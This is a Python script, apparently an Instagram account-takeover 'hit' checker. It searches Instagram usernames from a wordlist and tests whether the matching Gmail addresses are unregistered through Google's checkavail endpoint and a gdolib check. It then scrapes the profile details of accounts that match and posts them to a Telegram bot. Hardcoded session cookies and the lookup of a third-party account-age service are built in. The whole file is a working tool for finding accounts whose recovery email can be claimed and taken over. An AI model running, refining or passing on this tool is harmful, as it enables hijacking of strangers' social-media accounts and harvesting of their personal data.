import requests,os
import gdolib
import random
from uuid import uuid4
import json
import datetime
VB=datetime.datetime.now()
G = '\033[2;32m'
R = '\033[2;31m'
#############################
token = input("𝙏𝙊𝙆𝙀𝙉 ➪  " )
print('━━━━━━━━━━━━━━━━━━')
ID = input("𝙄𝘿 ➪  " )
print('━━━━━━━━━━━━━━━━━━')
sessionid = id = input(" 𝙎𝙀𝙎𝙎𝙄𝙊𝙉 𝙄𝘿  ➪  " )
print('━━━━━━━━━━━━━━━━━━')
os.system('clear')
h=0
k=0
l=0
header={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
#############################
def rand():
        global h,k,l,VB
        hit = 0
        text = input("NAME LISTA : " )
        print( """ \033[1;91m------------------------------------ """)
        try:
            filee = open(f'{text}', "r")
        except:
            exit(' EROR ')
#-------------------------------------------    
        while True:
            ur = filee.readline().split('\n')[0]
            if ur =='':
                exit(' 👌🏻 DONE FINESHED LISTA 🔴 ')
            name = ur.split('@')[0]
            ch = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
            if "users" in ch.text:
             for i in ch.json()["users"]:
              user=(i['user']['username'])
              em = user
              email = em+"@gmail.com"               
              url = 'https://android.clients.google.com/setup/checkavail'
              hed = {
	    'Content-Length':'98',
	    'Content-Type':'text/plain; charset=UTF-8',
	    'Host':'android.clients.google.com',
	    'Connection':'Keep-Alive',
	    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
              data = json.dumps({
	'username':email,
	'version':'3',
	'firstName':'AbaLahb',
	})
              res = requests.post(url,data=data,headers=hed)
              if res.json()['status'] == 'SUCCESS':
                      check = gdolib.check_email.instagram(email)
                      if check['status']=='Success':
                          hit += 1
                          print(G+f'HIT EMAIL : {email} ')
                          user = email.split('@')[0]
                          try:
                           rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=header).json()  
                           nam = str(rr['graphql']['user']['full_name'])
                           iddd = str(rr['graphql']['user']['id'])
                           fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                           fols =str(rr['graphql']['user']['edge_follow']['count'])
                           isp = str(rr['graphql']['user']['is_private'])
                           bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
                           re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
                           ree = re.json()
                           dat = ree['date']
                           h+=1
                           os.system('cls'if os.name=='net'else'clear')
                           print(f'''
\033[4;35mTIME : [{VB}] 
\033[4;32mGOOD : [{h}]
\033[4;33mBAD INSTA:  [{k}]
\033[4;31mBAD GMAIL : [{l}]
\033[4;30mGMAIL :[{email}]
\033[4;37mBY  ➪ @SX_9_O''')
                           tlg =(f"""
‌‌‌               ‌  
⋘─────━────⋙
𝙝𝙞𝙩 ➪ {hit}
𝙉𝙖𝙢𝙚 ➪ {nam}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➪ {user}
𝙀𝙢𝙖𝙞𝙡 ➪ {email}
𝙁𝙤𝙡𝙡𝙤𝙬𝙖𝙧𝙨 ➪ {fol}
𝙁𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 ➪ {fols}
𝘿𝙖𝙩𝙖 ➪ {dat}
𝙋𝙤𝙨𝙩 ➪ {bio}
𝙇𝙞𝙣𝙠 ➪ https://www.instagram.com/{user}
⋘─────────⋙
BY : @SX_9_O """)
                           print(tlg)
                           requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
                          except:
                           tlg=(f"""
‌‌‌               ‌ 
⋘─────────⋙
𝙝𝙞𝙩 ➪ {hit}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➪ {user}
𝙁𝙤𝙡𝙡𝙤𝙬𝙖𝙧𝙨 ➪ {fol}
𝙁𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 ➪ {fols}
𝘿𝙖𝙩𝙖 ➪ {dat}
𝙋𝙤𝙨𝙩 ➪ {bio}
𝙀𝙢𝙖𝙞𝙡 ➪ {email}
𝙇𝙞𝙣𝙠 ➪ https://www.instagram.com/{user}
⋘─────────⋙
BY : @SX_9_O  """)
                           requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
                           print(tlg)
                      else:
                          k+=1
                          os.system('cls'if os.name=='net'else'clear')
                          print(f'''
\033[4;35mTIME : [{VB}] 
\033[4;32mGOOD : [{h}]
\033[4;33mBAD INSTA:  [{k}]
\033[4;31mBAD GMAIL : [{l}]
\033[4;30mGMAIL :[{email}]
\033[4;37mBY  ➪ @SX_9_O''')
              elif res.json()['status'] =='USERNAME_UNAVAILABLE':
                  l+=1
                  os.system('cls'if os.name=='net'else'clear')
                  print(f'''
\033[4;35mTIME : [{VB}] 
\033[4;32mGOOD : [{h}]
\033[4;33mBAD INSTA:  [{k}]
\033[4;31mBAD GMAIL : [{l}]
\033[4;30mGMAIL :[{email}]
\033[4;37mBY  ➪ @SX_9_O''')
              else:
                  print(f"{R} للاسف نحضرت ضلعلي")
                  exit()                  
            else:
                rand()  
rand()                                